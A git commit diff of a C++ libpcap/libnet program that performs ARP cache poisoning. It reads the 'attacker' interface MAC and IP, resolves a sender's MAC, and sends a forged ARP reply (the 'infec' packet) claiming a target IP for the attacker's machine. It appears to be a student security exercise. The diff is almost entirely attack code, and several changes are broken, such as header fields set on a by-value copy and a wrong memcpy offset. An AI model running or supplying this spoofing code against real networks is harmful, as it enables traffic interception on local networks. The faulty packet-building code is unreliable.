ac140b3bc9ca761baf71c3fc365c36b3df233394
sured415 <wtghnh@gmail.com>
2018-04-14 01:06:31 -0400

    Mod main.cpp

--- main.cpp
+++ main.cpp
@@ -10,14 +10,21 @@
 #include <cstring>
 #include <iostream>
 
+using namespace std;
+
 struct libnet_ethernet_hdr ehtH;
-struct libnet_arp_hdr arpH;
-struct arpAddr {
+//struct libnet_arp_hdr arpH;
+struct arp_hdr : public libnet_arp_hdr {
 	u_int8_t sha[6];
 	u_int8_t spa[4];
 	u_int8_t tha[6];
 	u_int8_t tpa[4];
-} req, end;
+} req, infec;
+
+struct add {
+	u_int8_t ip[4];
+	u_int8_t mac[6];
+} my, sender, target;
 
 void getAttacker(char* dev) {
 	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
@@ -25,13 +32,13 @@ void getAttacker(char* dev) {
 	strcpy(s.ifr_name, dev);
 
 	ioctl(fd, SIOCGIFHWADDR, &s);
-	memcpy(ehtH.ether_shost, s.ifr_hwaddr.sa_data, sizeof(s.ifr_hwaddr.sa_data));
+	memcpy(my.mac, s.ifr_hwaddr.sa_data, sizeof(s.ifr_hwaddr.sa_data));
 
 	ioctl(fd, SIOCGIFADDR, &s);
-	memcpy(req.spa, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
+	memcpy(my.ip, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
 }
 
-void makearp(char* ti, u_int16_t arpop) {
+void makearp(struct arp_hdr a, char* ti, u_int16_t arpop) {
 	for(int i=0; i<6; i++) {
 		ehtH.ether_dhost[i] = '\xff';
 		req.sha[i] = ehtH.ether_shost[i];
@@ -39,18 +46,17 @@ void makearp(char* ti, u_int16_t arpop) {
 	}
 
 	ehtH.ether_type = ntohs(ETHERTYPE_ARP);
-	arpH.ar_hrd = ntohs(ARPHRD_ETHER);
-	arpH.ar_pro = ntohs(ETHERTYPE_IP);
-	arpH.ar_hln = 6;
-	arpH.ar_pln = 4;
-	arpH.ar_op = ntohs(arpop);
+	a.ar_hrd = ntohs(ARPHRD_ETHER);
+	a.ar_pro = ntohs(ETHERTYPE_IP);
+	a.ar_hln = 6;
+	a.ar_pln = 4;
+	a.ar_op = ntohs(arpop);
 	inet_pton(AF_INET, ti, req.tpa);
 }
 
-void makepacket(u_int8_t* packet, struct arpAddr a) {
+void makepacket(u_int8_t* packet, struct arp_hdr a) {
 	memcpy(packet, &ehtH, sizeof(struct libnet_ethernet_hdr));
-        memcpy(packet+sizeof(struct libnet_ethernet_hdr), &arpH, sizeof(struct libnet_arp_hdr));
-        memcpy(packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr), &a, sizeof(struct arpAddr));
+        memcpy(packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct arp_hdr), &a, sizeof(struct arp_hdr));
 }
 
 int main(int argc, char* argv[]) {
@@ -63,8 +69,12 @@ int main(int argc, char* argv[]) {
 
 	getAttacker(dev);
 
+	memcpy(ehtH.ether_shost, my.mac, sizeof(my.mac));
+	memcpy(req.spa, my.ip, sizeof(my.ip));
+
 	char* senderip = argv[2];
-	makearp(senderip, ARPOP_REQUEST);
+	makearp(req, senderip, ARPOP_REQUEST);
+	makearp(infec, argv[3], ARPOP_REPLY);
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -73,8 +83,8 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + sizeof(struct arpAddr);
-	u_int8_t arppacket[size];
+	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arp_hdr);
+	u_int8_t arppacket[size], arp_infec_packet[size];
 
 	makepacket(arppacket, req);
 
@@ -92,21 +102,35 @@ int main(int argc, char* argv[]) {
 		if(ntohs(replyehtH->ether_type) == ETHERTYPE_ARP) {
 			packet += sizeof(struct libnet_ethernet_hdr);
 			packet += sizeof(struct libnet_arp_hdr);
-			struct arpAddr* reply = (struct arpAddr *)packet;
+			struct arp_hdr* reply = (struct arp_hdr *)packet;
 			if(strcmp((char*)req.tpa, (char*)reply->spa) == 0){
-				for(int i=0; i<6; i++) end.tha[i] = reply->sha[i];
+				for(int i=0; i<6; i++) infec.tha[i] = reply->sha[i];
 				break;
 			}
 		}
 	}
 
-	for(int i=0; i<6; i++) ehtH.ether_dhost[i] = end.tha[i];
-	inet_pton(AF_INET, argv[3], end.spa);
-	arpH.ar_op = ntohs(ARPOP_REPLY);
-	makepacket(arppacket, end);
+	for(int i=0; i<6; i++) ehtH.ether_dhost[i] = infec.tha[i];
+//	inet_pton(AF_INET, argv[3], infec.spa);
+//	arpH.ar_op = ntohs(ARPOP_REPLY);
+	makepacket(arp_infec_packet, infec);
 
-	pcap_sendpacket(handle, arppacket, size);
+	pcap_sendpacket(handle, arp_infec_packet, size);
 
-	printf("\n");
+//	while (true) {
+//		res = pcap_next_ex(handle, &header, &packet);
+//		if (res == 0) continue;
+//		if (res == -1 || res == -2) break;
+//
+//		struct libnet_ethernet_hdr* check_ehtH = (struct libnet_ethernet_hdr *)packet;
+//		switch(ntohs(check_ehtH->ether_type)){
+//			case ETHERTYPE_IP : break;
+//			case ETHERTYPE_ARP : break;
+//			default : break;
+//		}
+//	}
+
+	pcap_close(handle);
+	cout << endl;
 	return 0;
 }
